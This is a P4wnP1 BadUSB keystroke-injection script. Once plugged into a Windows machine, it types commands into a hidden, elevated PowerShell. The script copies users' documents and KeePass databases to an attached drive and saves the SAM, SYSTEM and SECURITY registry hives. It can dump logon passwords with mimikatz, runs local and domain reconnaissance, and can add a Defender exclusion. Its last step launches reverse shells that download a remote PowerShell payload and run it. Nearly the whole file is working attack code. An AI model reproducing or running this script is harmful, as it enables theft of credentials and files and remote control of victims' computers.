/*###########################################################################################################################################\
# all_in_one.js                                                                                                                              #
#   All in one script. Contains:                                                                                                             #                                           
#    - [Extraction] Reconnaissance of Local machine and Domain....[Standalone: recon.js]                                                     #
#    - [Extraction] SAM, System and Security files extraction.....[Standalone: sam_dump.js]                                                  #
#    - [Extraction] User files extraction.........................[Standalone: user_files_exfil.js]                                          #
#    - [Malicious code] Reverse Shell code execution..............[Standalone: reverse_shell.js]                                             #
#                                                                                                                                            #
#   Extract data to additional USB/SSD or to P4wnP1 mass storage.                                                                            #
#                                                                                                                                            #
#   Author: "cac3r" (Using "chriskalv" original "allinOne_extraction.js" script as a base)                                                   #
#                                                                                                                                            #
# PREREQUISTES:                                                                                                                              #
# - Enable keyboard capability and, if you want to extract directly to P4wnP1's microSD, USB mass storage capability in settings.            #
# - Place mimikatz in P4wnP1:\tools in order to be able to extract users & passwords hashes with it.                                         #
# - If using Recon > Domain > SharpHound: Add SharpHound.exe to the root of the external USB device or to P4wnP1:\tools if using PI microSD. # 
# - Edit global settings below.                                                                                                              #
\###########################################################################################################################################*/

////////////////////////// GLOBAL SETTINGS ///////////////////////////////////////\
// GENERAL                                                                       // ---
layout("us");                                                                    // Keyboard layout
typingSpeed(0,0);                                                                // Typing = really fast
run_as_admin=true;                                                               // Set to true to execute powershell as Administrator
extract_to_ssd=true;                                                             // Set to true to extract everything to an external SSD instead of mass storage of your P4wnP1 device (might be the better alternative if there are more than just a few)
hide=true;                                                                       // Set to true to hide the console window on the target
exit=true;                                                                       // Set to true to exit the console once finished
modify_defender=false;                                                           // Disable and enable Windows defender in the process of this script (Powershell must be run as Administrator for this to work [run_as_admin=true])
var usb_drive = "TEMPUSB"                                                        // The name of the P4wnP1's USB storage device, which will be used if "extract_to_ssd" is set to false
var ssd_drive = "USB_OUT";                                                       // The name of your external SSD drive, which will be used if "extract_to_ssd" is set to true
// FILES EXTRACTION (USER FILES)                                                 // ---
extract_files=true;                                                              // Set to true to enable the extraction of files
var user_subfolder1 = ["Documents"]                                              // The first folder inside the home user directory to be inspected
var user_subfolder2 = ["Downloads"]                                              // The second
var user_subfolder3 = ["Desktop"]                                                // ...
var user_subfolder4 = ["Pictures"]                                               // ...
var filetypes_user = ["pdf", "txt", "docx", "xlsx", "jpg", "png", "kdbx", "db"]  // The filetypes to extract from previously specified folders in the home directory (Add .xml, .bak, .zip, and any other you find interesting)
// WINDOWS CREDENTIALS EXTRACTION (SAM DUMP)                                     // ---
sam=true;                                                                        // Set to true to enable the extraction of Windows credentials dbs (Powershell must be run as Administrator for this to work [run_as_admin=true]). Might be problematic to execute if AntiVir is active on the target system.
mimikatz=false;                                                                  // Use Mimikatz
// RECON                                                                         // ---                                                                                     
extract_local_recon_data=true;                                                   // Set to true to run commands to discover local information about the machine target (Basic PS commands. Data: IP, open Ports, system information, PS History, ...)
extract_domain_recon_data=false;                                                 // Set to true to run commands to discover domain information about the machine target if applicable (AD PS Module. Data: Domain name, Users, Groups, Shares, ...)
sharphound=false;                                                                // Set to true to run SharpHound full collection. SharpHound.exe must be present on chosen storage. Read PREREQUISITES
// REVERSE SHELLS                                                                // NOTE: Very likely to get flaged and droped by Windows 10/11 AV,AMSI,...
revshell_powercat=false;                                                         // Set to true to enable powercat reverse shell trigger
revshell_nishang=true;                                                           // Set to true to enable nishang style reverse shell trigger
revshell_conPtyShell=false;                                                      // Set to true to enable conPtyShell reverse shell trigger
//////////////////////////////////////////////////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 5                                                 // The time to wait before executing the attack in seconds
var ready = "False"                                                // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                           // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                                // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                       // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                        // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open powershell
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");     // Hide the console if chosen to do so
    if (run_as_admin) {                                                        // Run powershell either as admin or standard user
        press("CTRL SHIFT ENTER");
            delay(1000);
        press("LEFT");
        delay(200);
        press("ENTER");
        delay(200);
    } else {
        type("\n");
        delay(1000);
    }

  // Identify path/directory names
    if (extract_to_ssd) {
      type("$usbPath =((gwmi win32_volume -f 'label=''" + ssd_drive + "''').Name);");
    } else {
      type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
    }
    type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
    type("$lootfolder = 'loot_' +$timestamp;");
    type("\n");
    delay(1000);
  
  // Disable Windows Defender
  if (modify_defender && run_as_admin) {
    type("Import-Module Defender;\n");
    type("Set-MpPreference -ExclusionPath $usbPath;\n");
    delay(1000)
  }
    
  // Create directories
    if (extract_files) type("$lootPathFiles = $usbPath+ '' +$lootfolder+ '\\files\';mkdir $lootPathFiles;");
    if (sam && run_as_admin) type("$lootPathWincreds = $usbPath+ '' +$lootfolder+ '\\windows_credentials\';mkdir $lootPathWincreds;"); 
    if (extract_local_recon_data) type("$lootPathLoco = $usbPath+ '' +$lootfolder+ '\\local\';mkdir $lootPathLoco;");
    if (extract_domain_recon_data) type("$lootPathDomo = $usbPath+ '' +$lootfolder+ '\\domain\';mkdir $lootPathDomo;");
    if (mimikatz && run_as_admin) type("$lootPathUsersPasswords = $usbPath+ '' +$lootfolder+ '\\users_and_passwords\';mkdir $lootPathUsersPasswords;") 
    type("\n");
    delay(100);

   
  // Copy files of specified filetypes from specified folders (depth: 4 directories)
    if (extract_files) {
        type("$home_directory = Get-Variable HOME -valueOnly;");
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder1 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder1 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")                           
            type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder1 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder1 + "\\" + filetypes_user[i] + ";\n")
        }  
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder2 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                                 
            type("copy $home_directory\\" + user_subfolder2 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder2 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder2 + "\\" + filetypes_user[i] + ";\n")
        }
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder3 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")                                 
            type("copy $home_directory\\" + user_subfolder3 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder3 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder3 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder3 + "\\" + filetypes_user[i] + ";\n")
        }
        for (var i = 0; i < filetypes_user.length; i++) {
            type("mkdir $lootPathFiles\\" + user_subfolder4 + "\\" + filetypes_user[i] + ";\n");
            type("copy $home_directory\\" + user_subfolder4 + "\\*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder4 + "\\" + filetypes_user[i] + ";\n")                                 
            type("copy $home_directory\\" + user_subfolder4 + "\\*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder4 + "\\" + filetypes_user[i] + ";\n")                              
            type("copy $home_directory\\" + user_subfolder4 + "\\*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder4 + "\\" + filetypes_user[i] + ";\n")
            type("copy $home_directory\\" + user_subfolder4 + "\\*/*/*/*." + filetypes_user[i] + " $lootPathFiles\\" + user_subfolder4 + "\\" + filetypes_user[i] + ";\n")
        }
    }

  // Extract Windows credentials
    if (sam && run_as_admin) {
        type("reg.exe save hklm\\sam $lootPathWincreds\\SAM;");                // Save the SAM file
        type("reg.exe save hklm\\system $lootPathWincreds\\System;");          // Save the System file
        type("reg.exe save hklm\\security $lootPathWincreds\\Security;");      // Save Security file
	delay(4000)
    }

  // Get users and passwords (hashes) with mimikatz
    if (mimikatz && run_as_admin) {
        type("cd $usbPath;\n");
        type("cd /tools;\n");
        type('.\\pw.exe "privilege::debug" "sekurlsa::logonpasswords" "exit">> $lootPathUsersPasswords\\$env:UserName`.txt;\n');
        delay(1000)
    }

  // Run recon commands and extract output files
    // LOCAL
    if (extract_local_recon_data) {
      //type("<CMD> | Out-File -FilePath ($lootPathLoco + '_<CMD>.txt');");             
      type("ipconfig /all | Out-File -FilePath ($lootPathLoco + '_ipconfig.txt');");   // ifconfig
      type("\n")
      delay(10) 
      type("hostname | Out-File -FilePath ($lootPathLoco + '_hostname.txt');");        // hostname
      type("\n")
      delay(100) 
      type("systeminfo | Out-File -FilePath ($lootPathLoco + '_systeminfo.txt');");    // systeminfo
      type("\n")
      delay(100) 
      type("whoami /all | Out-File -FilePath ($lootPathLoco + '_whoami.txt');");       // whoami
      type("\n")
      delay(200) 
      type("Get-NetTCPConnection -State Listen | Select-Object LocalAddress,LocalPort,State | Sort-Object -Property LocalPort | Format-Table | Out-File -FilePath ($lootPathLoco + '_ports.txt');");  // TCP open Port scan
      type("\n")
      delay(1000) 
      type("Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File -FilePath ($lootPathLoco + '_PSHistory.txt');");    // PowerShell History
      type("\n")
      delay(200)
    }
    // DOMAIN (AD)
    if (extract_domain_recon_data) {
      //type("<CMD> | Out-File -FilePath ($lootPathDomo + '<CMD>.txt');");
      type("Import-Module ActiveDirectory;");                                         // Import AD module
      type("\n")        
      type("Get-ADDomain | Out-File -FilePath ($lootPathDomo + '_ADDomain.txt');");  // Get Domain information
      type("\n")
      delay(60) 
      type("Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)' | Out-File -FilePath ($lootPathDomo + '_ADUsers.txt');");  // Get Domain Users
      type("\n")
      delay(100) 
      type("Get-ADGroup -Filter * | select name | Out-File -FilePath ($lootPathDomo + '_ADGroups.txt');");      // Get Domain Groups
      type("\n")
      delay(200) 
      type("Get-ADGroupMember -Identity 'Domain Admins' | Out-File -FilePath ($lootPathDomo + '_DAs.txt');");   // Get Accounts member of Domain Admins
      type("\n")
      delay(200)
      type("Get-SMBShare | Out-File -FilePath ($lootPathDomo + '_Shares.txt');")                                // Get Shares information (no share download)
      type("\n")
      delay(200)
      type("Get-ADDefaultDomainPasswordPolicy | Out-File -FilePath ($lootPathDomo + '_PassPol.txt');")          // Get Domain Password Policy
      type("\n")
      delay(100) 
    }

    // SharpHound
    if (extract_domain_recon_data && sharphound) {
      type("cd $usbPath;\n");                                    // Change directory to USB/Pi storage 
      type("SharpHound.exe -c All --zipfilename SharpH.zip;")    // Run SharpHound full collection. Out to zip
      type("\n")
      delay(1000)
    }
  
  // Reverse Shell trigger. Fill the variables(IP, PORT, PATH to MALICIOUS FILE) or write new payload
    // type("<PAYLOAD>")
    if (revshell_nishang) {      // nishang Invoke-*
      type("IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/<MALFILE.ps1>');<MALFILE.ps1>")
      type("\n")      
    }
    if (revshell_conPtyShell) {  // conPtyShell
      type("IEX(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell -RemoteIp <IP> -RemotePort <PORT> -Rows 24 -Cols 80")
      type("\n")     
    }
    if (revshell_powercat) {     // powercat
      type("$code=(New-Object System.Net.Webclient).DownloadString('http://<IP>:<port>/<malfile>');iex 'powershell -E $code'")
      type("\n")
    }

  // Clean up
    if (modify_defender) {
      type("Remove-MpPreference -ExclusionPath $usbPath;\n");                 // Enable Windows Defender again
    }
  
  // Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}

delay(delay_time * 100);
check_if_ready();
attack();
